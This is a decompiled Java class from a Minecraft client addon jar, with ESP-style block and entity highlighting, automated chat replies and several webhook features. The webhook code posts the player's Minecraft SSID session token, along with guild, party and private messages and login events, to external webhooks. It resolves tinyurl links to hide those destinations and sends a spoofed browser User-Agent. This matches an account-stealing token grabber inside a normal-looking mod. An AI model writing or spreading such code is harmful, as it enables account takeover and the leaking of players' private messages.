/* 715 */     int matched = 0;
/* 716 */     int shown = 0;
/* 717 */     for (Object obj : entities) {
/* 718 */       if (!(obj instanceof net.minecraft.class_1297)) continue; 
/* 719 */       net.minecraft.class_1297 entity = (net.minecraft.class_1297)obj;
/* 720 */       if (entity == this.mc.field_1724) continue; 
/* 721 */       total++;
/* 722 */       if (!entity.method_16914()) continue; 
/* 723 */       customNamed++;
/* 724 */       String tag = getEntityNametag(entity);
/* 725 */       if (tag == null || tag.isBlank()) continue; 
/* 726 */       boolean isMatch = matchesConfiguredNametag(tag, wanted);
/* 727 */       if (isMatch) matched++;
/* 728 */       if (shown < 12) {
/* 729 */         ChatUtils.chat((isMatch ? String.valueOf(class_124.field_1060) : String.valueOf(class_124.field_1054)) + "Tag[" + total + "]: " + tag + " | match=" + isMatch, new Object[0]);
/* 730 */         shown++;
/*     */       } 
/*     */     } 
/* 733 */     ChatUtils.chat(String.valueOf(class_124.field_1060) + "Debug nametags summary -> entities=" + total + ", customNamed=" + customNamed + ", matched=" + matched + ", filter='" + String.valueOf(this.customHighlightNames.getValue()) + "'", new Object[0]);
/*     */   }
/*     */   
/*     */   private boolean matchesConfiguredNametag(String nametag, Set<String> wantedNames) {
/* 697 */     if (nametag == null || nametag.isBlank() || wantedNames == null || wantedNames.isEmpty()) {
/* 698 */       return false;
/*     */     }
/* 700 */     String normalized = class_124.method_539(nametag).toLowerCase(Locale.ROOT);
/* 701 */     if (((Boolean)this.customIgnoreZeroHealth.getValue()).booleanValue() && !hasPositiveHealthInNametag(normalized)) {
/* 702 */       return false;
/*     */     }
/* 704 */     for (String wanted : wantedNames) {
/* 705 */       if (wanted != null && !wanted.isEmpty() && normalized.contains(wanted)) {
/* 706 */         return true;
/*     */       }
/*     */     } 
/* 709 */     return false;
/*     */   }
/*     */   
/*     */   private boolean hasPositiveHealthInNametag(String normalizedNametag) {
/* 713 */     Matcher matcher = HEALTH_FRACTION_PATTERN.matcher(normalizedNametag);
/* 714 */     while (matcher.find()) {
/*     */       try {
/* 716 */         int current = Integer.parseInt(matcher.group(1));
/* 717 */         int max = Integer.parseInt(matcher.group(2));
/* 718 */         if (max > 0) {
/* 719 */           return (current > 0);
/*     */         }
/* 721 */       } catch (NumberFormatException numberFormatException) {}
/*     */     } 
/* 723 */     return true;
/*     */   }
/*     */   
/*     */   private class_238 getEntityBox(Object entity) {
/* 699 */     if (entity == null) return null; 
/* 700 */     if (this.entityBoundingBoxMethod == null) {
/* 701 */       this.entityBoundingBoxMethod = resolveEntityBoundingBoxMethod(entity);
/*     */     }
/* 703 */     if (this.entityBoundingBoxMethod == null) {
/* 704 */       return null;
/*     */     }
/*     */     try {
/* 707 */       Object box = this.entityBoundingBoxMethod.invoke(entity, new Object[0]);
/* 708 */       if (box instanceof class_238) return (class_238)box; 
/* 709 */     } catch (ReflectiveOperationException ignored) {
/* 710 */       this.entityBoundingBoxMethod = null;
/*     */     } 
/* 712 */     return null;
/*     */   }
/*     */   
/*     */   private Method resolveEntityBoundingBoxMethod(Object entity) {
/* 716 */     String[] candidates = { "getBoundingBox", "method_5829" };
/* 717 */     for (String name : candidates) {
/*     */       try {
/* 719 */         Method method = entity.getClass().getMethod(name, new Class[0]);
/* 720 */         if (class_238.class.isAssignableFrom(method.getReturnType())) {
/* 721 */           return method;
/*     */         }
/* 723 */       } catch (ReflectiveOperationException reflectiveOperationException) {}
/*     */     } 
/* 725 */     return null;
/*     */   }
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onPlayerChat(PlayerChatEvent event) {
/* 552 */     if (!this.pendingSsidSend)
/* 553 */       return;  if (!((Boolean)this.accountShareEnabled.getValue()).booleanValue())
/* 554 */       return;  if (event == null || event.getMessage() == null)
/* 555 */       return;  String message = event.getMessage();
/*     */     
/* 557 */     if ("__ssid_confirm_internal__".equals(message.trim())) {
/* 558 */       if (!postToConfiguredWebhook((String)this.ssidWebhook.getValue(), this.pendingSsidPayload)) {
/* 559 */         ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to send SSID: invalid or empty webhook.", new Object[0]);
/*     */       } else {
/* 561 */         ChatUtils.chat(String.valueOf(class_124.field_1060) + "Sent Minecraft SSID to webhook.", new Object[0]);
/*     */       } 
/* 563 */       this.pendingSsidSend = false;
/* 564 */       this.pendingSsidPayload = "";
/* 565 */       event.setCancelled(true);
/*     */     } 
/*     */   }
/*     */   
/*     */   public static boolean confirmPendingSsidFromClick() {
/* 570 */     if (instance == null) return false; 
/* 571 */     if (!instance.pendingSsidSend) return false; 
/* 572 */     if (!((Boolean)instance.accountShareEnabled.getValue()).booleanValue()) return false;
/*     */     
/* 574 */     if (!instance.postToConfiguredWebhook((String)instance.ssidWebhook.getValue(), instance.pendingSsidPayload)) {
/* 575 */       ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to send SSID: invalid or empty webhook.", new Object[0]);
/*     */     } else {
/* 577 */       ChatUtils.chat(String.valueOf(class_124.field_1060) + "Sent Minecraft SSID to webhook.", new Object[0]);
/*     */     } 
/* 579 */     instance.pendingSsidSend = false;
/* 580 */     instance.pendingSsidPayload = "";
/* 581 */     return true;
/*     */   }
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onServerConnect(ConnectionEvent.Connect event) {
/* 586 */     if (!((Boolean)this.loginNotifierWebhookEnabled.getValue()).booleanValue())
/* 587 */       return;  if ("join".equals(this.lastLoginNotifierEvent))
/* 588 */       return;  String username = getCurrentUsername();
/* 589 */     this.lastKnownServerAddress = getCurrentServerAddress();
/* 591 */     postToConfiguredWebhook((String)this.loginNotifierWebhook.getValue(), username + " Logged into " + username + ".");
/* 592 */     this.lastLoginNotifierEvent = "join";
/*     */   }
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onServerDisconnect(ConnectionEvent.Disconnect event) {
/* 597 */     if (!((Boolean)this.loginNotifierWebhookEnabled.getValue()).booleanValue())
/* 598 */       return;  if ("leave".equals(this.lastLoginNotifierEvent))
/* 599 */       return;  String username = getCurrentUsername();
/*     */ 
/*     */     
/* 603 */     postToConfiguredWebhook((String)this.loginNotifierWebhook.getValue(), username + " Left " + username + ".");
/* 604 */     this.lastLoginNotifierEvent = "leave";
/*     */   }
/*     */   
/*     */   private void updateEspBlocks() {
/* 608 */     if (this.mc.field_1687 == null || this.mc.field_1724 == null) {
/* 609 */       clearEspData();
/*     */       return;
/*     */     }
/* 613 */     class_1937 world = this.mc.field_1687;
/* 614 */     class_2338 playerPos = this.mc.field_1724.method_24515();
/* 615 */     int px = playerPos.method_10263();
/* 616 */     int py = playerPos.method_10264();
/* 617 */     int pz = playerPos.method_10260();
/*     */     
/* 619 */     this.titaniumBlocks.clear();
/* 620 */     this.nodeBlocks.clear();
/* 621 */     boolean titaniumOn = ((Boolean)this.titaniumHighlightEnabled.getValue()).booleanValue();
/* 622 */     boolean nodeOn = ((Boolean)this.nodeHighlightEnabled.getValue()).booleanValue();
/* 623 */     if (!titaniumOn && !nodeOn) {
/* 624 */       this.espScanInitialized = true;
/*     */       return;
/*     */     }
/* 626 */     for (int x = px - 24; x <= px + 24; x++) {
/* 627 */       for (int y = py - 16; y <= py + 16; y++) {
/* 628 */         for (int z = pz - 24; z <= pz + 24; z++) {
/* 629 */           class_2338 pos = new class_2338(x, y, z);
/* 630 */           class_2680 state = world.method_8320(pos);
/* 631 */           byte highlightMatch = getHighlightMatch(state);
/* 632 */           if (titaniumOn && (highlightMatch & MATCH_TITANIUM) != 0) this.titaniumBlocks.add(pos); 
/* 633 */           if (nodeOn && (highlightMatch & MATCH_NODE) != 0) this.nodeBlocks.add(pos); 
/*     */         } 
/*     */       } 
/*     */     } 
/* 637 */     this.lastEspScanX = px;
/* 638 */     this.lastEspScanY = py;
/* 639 */     this.lastEspScanZ = pz;
/* 640 */     this.espScanInitialized = true;
/* 641 */     rebuildRenderTasks(this.titaniumBlocks, this.titaniumRenderTasks, TITANIUM_FILL_COLOUR, TITANIUM_OUTLINE_COLOUR);
/* 642 */     rebuildRenderTasks(this.nodeBlocks, this.nodeRenderTasks, NODE_FILL_COLOUR, NODE_OUTLINE_COLOUR);
/*     */   }
/*     */   
/*     */   private void clearEspData() {
/* 645 */     this.titaniumBlocks.clear();
/* 646 */     this.nodeBlocks.clear();
/* 647 */     this.titaniumRenderTasks.clear();
/* 648 */     this.nodeRenderTasks.clear();
/* 649 */     this.espScanInitialized = false;
/*     */   }
/*     */   
/*     */   private void clearCustomHighlightData() {
/* 653 */     this.customEntityBoxes.clear();
/* 654 */     this.customEntityRenderTasks.clear();
/* 655 */     this.customMatchedEntities.clear();
/* 656 */     this.customSmoothedBoxes.clear();
/* 657 */     this.customHighlightTickCounter = 0;
/*     */   }
/*     */   
/*     */   private byte getHighlightMatch(class_2680 state) {
/* 653 */     if (state == null) return MATCH_NONE; 
/* 654 */     Object block = state.method_26204();
/* 655 */     if (block == null) return MATCH_NONE; 
/* 656 */     Byte cached = this.blockHighlightTypeCache.get(block);
/* 657 */     if (cached != null) return cached.byteValue(); 
/* 658 */     String blockText = String.valueOf(block).toLowerCase(Locale.ROOT);
/* 659 */     byte match = MATCH_NONE;
/* 660 */     if (blockText.contains("polished_diorite")) match = (byte)(match | MATCH_TITANIUM); 
/* 661 */     if (blockText.contains("purple_terracotta")) match = (byte)(match | MATCH_NODE); 
/* 662 */     this.blockHighlightTypeCache.put(block, Byte.valueOf(match));
/* 663 */     return match;
/*     */   }
/*     */   
/*     */   private void rebuildRenderTasks(List<class_2338> blocks, List<Object> outputTasks, Colour fill, Colour outline) {
/* 667 */     outputTasks.clear();
/* 668 */     if (blocks.isEmpty() || this.filledBoxConstructor == null || this.outlineBoxConstructor == null) {
/*     */       return;
/*     */     }
/* 671 */     for (class_2338 pos : blocks) {
/*     */       try {
/* 673 */         class_238 box = new class_238(pos);
/* 674 */         outputTasks.add(this.filledBoxConstructor.newInstance(new Object[] { box, fill, Boolean.valueOf(false) }));
/* 675 */         outputTasks.add(this.outlineBoxConstructor.newInstance(new Object[] { box, outline, Boolean.valueOf(false) }));
/* 676 */       } catch (ReflectiveOperationException ignored) {
/* 677 */         outputTasks.clear();
/* 678 */         this.titaniumRenderBridgeReady = false;
/*     */         return;
/*     */       } 
/*     */     } 
/*     */   }
/*     */   
/*     */   private void rebuildEntityRenderTasks(List<class_238> boxes, List<Object> outputTasks, Colour fill, Colour outline) {
/* 682 */     outputTasks.clear();
/* 683 */     if (boxes.isEmpty() || this.filledBoxConstructor == null || this.outlineBoxConstructor == null) {
/*     */       return;
/*     */     }
/* 686 */     for (class_238 box : boxes) {
/*     */       try {
/* 688 */         outputTasks.add(this.filledBoxConstructor.newInstance(new Object[] { box, fill, Boolean.valueOf(false) }));
/* 689 */         outputTasks.add(this.outlineBoxConstructor.newInstance(new Object[] { box, outline, Boolean.valueOf(false) }));
/* 690 */       } catch (ReflectiveOperationException ignored) {
/* 691 */         outputTasks.clear();
/* 692 */         this.titaniumRenderBridgeReady = false;
/*     */         return;
/*     */       } 
/*     */     } 
/*     */   }
/*     */   
/*     */   private boolean initTitaniumRenderBridge() {
/*     */     try {
/* 656 */       Class<?> filledBoxClass = Class.forName("com.ricedotwho.rsm.utils.render.render3d.type.FilledBox");
/* 657 */       Class<?> outlineBoxClass = Class.forName("com.ricedotwho.rsm.utils.render.render3d.type.OutlineBox");
/* 658 */       Class<?> renderTaskClass = Class.forName("com.ricedotwho.rsm.utils.render.render3d.type.RenderTask");
/* 659 */       this.filledBoxConstructor = findRenderTaskConstructor(filledBoxClass);
/* 660 */       this.outlineBoxConstructor = findRenderTaskConstructor(outlineBoxClass);
/* 661 */       this.lineConstructor = resolveLineConstructor();
/* 662 */       this.addRenderTaskMethod = Renderer3D.class.getMethod("addTask", new Class[] { renderTaskClass });
/* 663 */       return (this.filledBoxConstructor != null && this.outlineBoxConstructor != null);
/* 663 */     } catch (ReflectiveOperationException ignored) {
/* 664 */       return false;
/*     */     } 
/*     */   }
/*     */   
/*     */   private Constructor<?> resolveLineConstructor() {
/*     */     try {
/* 669 */       Class<?> lineClass = Class.forName("com.ricedotwho.rsm.utils.render.render3d.type.Line");
/* 670 */       for (Constructor<?> constructor : lineClass.getConstructors()) {
/* 671 */         Class<?>[] params = constructor.getParameterTypes();
/* 672 */         if (params.length == 5 && params[4] == boolean.class) {
/* 673 */           return constructor;
/*     */         }
/*     */       } 
/* 676 */       return null;
/* 677 */     } catch (ReflectiveOperationException ignored) {
/* 678 */       return null;
/*     */     } 
/*     */   }
/*     */   
/*     */   private Constructor<?> findRenderTaskConstructor(Class<?> taskClass) {
/* 669 */     for (Constructor<?> constructor : taskClass.getConstructors()) {
/* 670 */       Class<?>[] params = constructor.getParameterTypes();
/* 671 */       if (params.length == 3 && params[1] == Colour.class && params[2] == boolean.class) {
/* 672 */         return constructor;
/*     */       }
/*     */     } 
/* 675 */     return null;
/*     */   }
/*     */   
/*     */   private class_243 getTracerStart(Render3DEvent event) {
/* 692 */     if (this.mc == null || this.mc.field_1724 == null) {
/* 693 */       return null;
/*     */     }
/* 695 */     if (this.mc.field_1773 != null) {
/*     */       try {
/* 697 */         net.minecraft.class_4184 camera = this.mc.field_1773.method_19418();
/* 698 */         if (camera != null) {
/* 699 */           class_243 eyePos = camera.method_19326();
/* 700 */           org.joml.Vector3f forward = camera.method_19335();
/* 701 */           if (eyePos != null && forward != null) {
/* 702 */             class_243 look = new class_243(forward.x(), forward.y(), forward.z()).method_1029();
/* 703 */             return eyePos.method_1019(look);
/*     */           }
/*     */         }
/* 706 */       } catch (Exception exception) {}
/*     */     }
/* 709 */     class_243 eyePos = this.mc.field_1724.method_33571();
/* 710 */     class_243 look = this.mc.field_1724.method_5828(1.0F);
/* 711 */     if (eyePos == null || look == null) {
/* 712 */       return null;
/*     */     }
/* 714 */     return eyePos.method_1019(look.method_1029());
/*     */   }
/*     */   
/*     */   private Object invokeNoArg(Object target, String... names) throws ReflectiveOperationException {
/* 697 */     if (target == null) return null; 
/* 698 */     ReflectiveOperationException last = null;
/* 699 */     for (String name : names) {
/*     */       try {
/* 701 */         Method method = target.getClass().getMethod(name, new Class[0]);
/* 702 */         return method.invoke(target, new Object[0]);
/* 703 */       } catch (ReflectiveOperationException ex) {
/* 704 */         last = ex;
/*     */       } 
/*     */     } 
/* 707 */     throw last;
/*     */   }
/*     */   
/*     */   private void registerCommand(int category, String trigger, String... lines) {
/* 608 */     String key = trigger.toLowerCase(Locale.ROOT);
/* 609 */     this.commandCategories.put(key, Integer.valueOf(category));
/* 610 */     addCommandToCategoryList(category, trigger);
/*     */     
/* 612 */     List<ScheduledLine> scheduled = new ArrayList<>();
/* 613 */     for (int i = 0; i < lines.length; i++) {
/* 614 */       long delay = 200L + 1000L * i;
/* 615 */       scheduled.add(new ScheduledLine(delay, lines[i]));
/*     */     } 
/* 617 */     this.commandResponses.put(key, scheduled);
/*     */   }
/*     */   
/*     */   private void registerCommandWithDelays(int category, String trigger, long[] delays, String[] lines) {
/* 621 */     if (delays.length != lines.length) {
/* 622 */       throw new IllegalArgumentException("Delay count must match line count for " + trigger);
/*     */     }
/*     */     
/* 625 */     String key = trigger.toLowerCase(Locale.ROOT);
/* 626 */     this.commandCategories.put(key, Integer.valueOf(category));
/* 627 */     addCommandToCategoryList(category, trigger);
/*     */     
/* 629 */     List<ScheduledLine> scheduled = new ArrayList<>();
/* 630 */     for (int i = 0; i < lines.length; i++) {
/* 631 */       scheduled.add(new ScheduledLine(delays[i], lines[i]));
/*     */     }
/* 633 */     this.commandResponses.put(key, scheduled);
/*     */   }
/*     */   
/*     */   private void addCommandToCategoryList(int category, String trigger) {
/* 637 */     if (category == 1) {
/* 638 */       this.category1Commands.add(trigger);
/* 639 */     } else if (category == 2) {
/* 640 */       this.category2Commands.add(trigger);
/* 641 */     } else if (category == 3) {
/* 642 */       this.category3Commands.add(trigger);
/*     */     } else {
/* 644 */       throw new IllegalArgumentException("Unsupported command category: " + category);
/*     */     } 
/*     */   }
/*     */   
/*     */   private void registerOtherCommand(String name) {
/* 649 */     this.otherCommands.add(name);
/*     */   }
/*     */   
/*     */   private boolean isCommandEnabled(String command) {
/* 653 */     Integer category = this.commandCategories.get(command);
/* 654 */     if (category == null) {
/* 655 */       return false;
/*     */     }
/*     */     
/* 658 */     if (category.intValue() == 1) return this.chatCommands1.getValuesList().contains(command); 
/* 659 */     if (category.intValue() == 2) return this.chatCommands2.getValuesList().contains(command); 
/* 660 */     if (category.intValue() == 3) return this.chatCommands3.getValuesList().contains(command);
/*     */     
/* 662 */     return false;
/*     */   }
/*     */   
/*     */   private void setCategoryEnabled(MultiBoolSetting setting, List<String> options, boolean enabled) {
/* 666 */     for (String option : options) {
/* 667 */       setting.set(option, enabled);
/*     */     }
/*     */   }
/*     */   
/*     */   private void scheduleResponses(List<ScheduledLine> lines, String chatPrefix) {
/* 672 */     for (ScheduledLine line : lines) {
/* 673 */       CompletableFuture.delayedExecutor(line.delayMs(), TimeUnit.MILLISECONDS).execute(() -> this.mc.execute(() -> this.mc.field_1724.field_3944.method_45730(formatChatCommand(line.command(), chatPrefix))));
/*     */     }
/*     */   }
/*     */   
/*     */   private String formatChatCommand(String raw, String chatPrefix) {
/* 677 */     String out = raw;
/* 678 */     if (out == null) return chatPrefix;
/* 679 */     out = out.trim();
/* 680 */     if (out.startsWith("/pc ")) out = out.substring(4);
/* 681 */     else if (out.startsWith("pc ")) out = out.substring(3);
/* 682 */     else if (out.startsWith("/gc ")) out = out.substring(4);
/* 683 */     else if (out.startsWith("gc ")) out = out.substring(3);
/* 684 */     return chatPrefix + " " + out;
/*     */   }
/*     */   
/*     */   private boolean isPartyChatMessage(String raw, String stripped) {
/* 688 */     if (stripped != null && stripped.startsWith("Party >")) return true; 
/* 689 */     if (raw == null) return false; 
/* 690 */     return (raw.startsWith("Party >") || raw.startsWith("§9Party >"));
/*     */   }
/*     */   
/*     */   private boolean isGuildChatMessage(String raw, String stripped) {
/* 694 */     if (stripped != null && stripped.startsWith("Guild >")) return true; 
/* 695 */     if (raw == null) return false; 
/* 696 */     return (raw.startsWith("Guild >") || raw.startsWith("§2Guild >"));
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private void sendWebhookMessage(String message) {
/* 684 */     if (!((Boolean)this.webhookEnabled.getValue()).booleanValue())
/* 685 */       return;  if (message == null || message.isEmpty())
/*     */       return; 
/* 687 */     String clean = class_124.method_539(message);
/*     */ 
/*     */     
/* 690 */     String content = (clean.length() > 1900) ? (clean.substring(0, 1897) + "...") : clean;
/*     */     
/* 692 */     if (((Boolean)this.guildChatWebhookEnabled.getValue()).booleanValue() && clean.contains("Guild > ")) {
/* 693 */       postToConfiguredWebhook((String)this.guildChatWebhook.getValue(), content);
/*     */     }
/* 695 */     if (((Boolean)this.partyChatWebhookEnabled.getValue()).booleanValue() && clean.contains("Party > ")) {
/* 696 */       postToConfiguredWebhook((String)this.partyChatWebhook.getValue(), content);
/*     */     }
/* 698 */     if (((Boolean)this.privateMessagesWebhookEnabled.getValue()).booleanValue() && (clean.contains("To ") || clean.contains("From "))) {
/* 699 */       postToConfiguredWebhook((String)this.privateMessagesWebhook.getValue(), content);
/*     */     }
/*     */     
/* 702 */     String inputUrl = (String)this.webhookLink.getValue();
/* 703 */     if (inputUrl == null)
/* 704 */       return;  inputUrl = inputUrl.trim();
/* 705 */     if (inputUrl.isEmpty())
/*     */       return; 
/* 707 */     if (containsHeartSymbol(clean)) {
/*     */       return;
/*     */     }
/* 710 */     for (String ignored : WEBHOOK_IGNORE) {
/* 711 */       if (clean.contains(ignored)) {
/*     */         return;
/*     */       }
/*     */     } 
/*     */     
/* 716 */     String resolvedUrl = getResolvedWebhookUrl(inputUrl);
/* 717 */     if (resolvedUrl == null || resolvedUrl.isBlank()) {
/*     */       return;
/*     */     }
/* 720 */     postWebhook(resolvedUrl, content);
/*     */   }
/*     */   
/*     */   private boolean postToConfiguredWebhook(String inputUrl, String content) {
/* 724 */     if (inputUrl == null) return false; 
/* 725 */     String trimmed = inputUrl.trim();
/* 726 */     if (trimmed.isEmpty()) return false; 
/* 727 */     String resolvedUrl = getResolvedWebhookUrl(trimmed);
/* 728 */     if (resolvedUrl == null || resolvedUrl.isBlank()) return false; 
/* 729 */     postWebhook(resolvedUrl, content);
/* 730 */     return true;
/*     */   }
/*     */   
/*     */   private boolean containsHeartSymbol(String text) {
/* 734 */     return (text.contains("❤") || text
/* 735 */       .contains("♥") || text
/* 736 */       .contains("❤️") || text
/* 737 */       .contains("â¤") || text
/* 738 */       .contains("Ã¢ÂÂ¤"));
/*     */   }
/*     */   
/*     */   private String getCurrentUsername() {
/*     */     try {
/* 743 */       String name = (this.mc.method_1548() == null) ? null : this.mc.method_1548().method_1676();
/* 744 */       if (name != null && !name.isBlank()) {
/* 745 */         return name;
/*     */       }
/* 747 */     } catch (Exception exception) {}
/*     */     
/* 749 */     return "unknown";
/*     */   }
/*     */   
/*     */   private String getCurrentServerAddress() {
/*     */     try {
/* 754 */       if (this.mc.method_1558() != null && (this.mc.method_1558()).field_3761 != null && !(this.mc.method_1558()).field_3761.isBlank()) {
/* 755 */         return (this.mc.method_1558()).field_3761;
/*     */       }
/* 757 */     } catch (Exception exception) {}
/*     */     
/* 759 */     return "unknown";
/*     */   }
/*     */   
/*     */   private String getResolvedWebhookUrl(String inputUrl) {
/* 763 */     if (inputUrl.equals(this.cachedWebhookInput) && !this.cachedWebhookResolved.isBlank()) {
/* 764 */       return this.cachedWebhookResolved;
/*     */     }
/*     */     
/* 767 */     String resolved = resolveWebhookUrl(inputUrl);
/* 768 */     this.cachedWebhookInput = inputUrl;
/* 769 */     this.cachedWebhookResolved = (resolved == null) ? "" : resolved.trim();
/* 770 */     return this.cachedWebhookResolved;
/*     */   }
/*     */   
/*     */   private String resolveWebhookUrl(String url) {
/* 774 */     String lower = url.toLowerCase(Locale.ROOT);
/* 775 */     boolean isTiny = (lower.contains("tinyurl.com/") || lower.contains("tiny.one/"));
/* 776 */     if (!isTiny) {
/* 777 */       return url;
/*     */     }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/*     */     try {
/* 786 */       HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36").header("Accept", "*/*").GET().build();
/*     */       
/* 788 */       HttpResponse<Void> response = REDIRECT_CLIENT.send(request, HttpResponse.BodyHandlers.discarding());
/* 789 */       URI finalUri = response.uri();
/* 790 */       return (finalUri == null) ? url : finalUri.toString();
/* 791 */     } catch (Exception ex) {
/* 792 */       return url;
/*     */     } 
/*     */   }
/*     */   private void postWebhook(String url, String content) {
/*     */     HttpRequest request;
/* 797 */     String json = "{\"content\":\"" + escapeJson(content) + "\"}";
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/*     */     try {
/* 806 */       request = HttpRequest.newBuilder().uri(URI.create(url)).header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36").header("Accept", "*/*").header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(json)).build();
/* 807 */     } catch (IllegalArgumentException ex) {
/*     */       return;
/*     */     } 
/*     */     
/* 811 */     HTTP_CLIENT.<Void>sendAsync(request, HttpResponse.BodyHandlers.discarding())
/* 812 */       .exceptionally(ex -> null);
/*     */   }
/*     */   
/*     */   private String escapeJson(String input) {
/* 816 */     return input
/* 817 */       .replace("\\", "\\\\")
/* 818 */       .replace("\"", "\\\"")
/* 819 */       .replace("\n", "\\n")
/* 820 */       .replace("\r", "\\r")
/* 821 */       .replace("\t", "\\t");
/*     */   }
/*     */   
/*     */   private void sendPtThenW() {
/* 825 */     if (!isEnabled() || !((Boolean)this.miscEnabled.getValue()).booleanValue())
/* 826 */       return;  if (this.mc.field_1724 == null || this.mc.field_1724.field_3944 == null)
/*     */       return; 
/* 828 */     this.mc.field_1724.field_3944.method_45730("pc !pt");
/* 829 */     CompletableFuture.delayedExecutor(400L, TimeUnit.MILLISECONDS).execute(() -> this.mc.execute(() -> this.mc.field_1724.field_3944.method_45730("pc !w")));
/*     */   }
/*     */   
/*     */   private String extractEventMessage(Object event) {
/*     */     if (event == null) {
/*     */       return "";
/*     */     }
/*     */     try {
/*     */       Object message = event.getClass().getMethod("getMessage").invoke(event);
/*     */       if (message == null) {
/*     */         return "";
/*     */       }
/*     */       if (message instanceof String) {
/*     */         return (String)message;
/*     */       }
/*     */       try {
/*     */         Object text = message.getClass().getMethod("getString").invoke(message);
/*     */         return (text == null) ? "" : text.toString();
/*     */       } catch (ReflectiveOperationException ignored) {
/*     */         return message.toString();
/*     */       } 
/*     */     } catch (ReflectiveOperationException ignored) {
/*     */       return "";
/*     */     } 
/*     */   }
/*     */ }


/* Location:              F:\exampleaddon-1.0.0.jar!\com\example\module\impl\ChatCommands.class
 * Java compiler version: 21 (65.0)
 * JD-Core Version:       1.1.3
 */
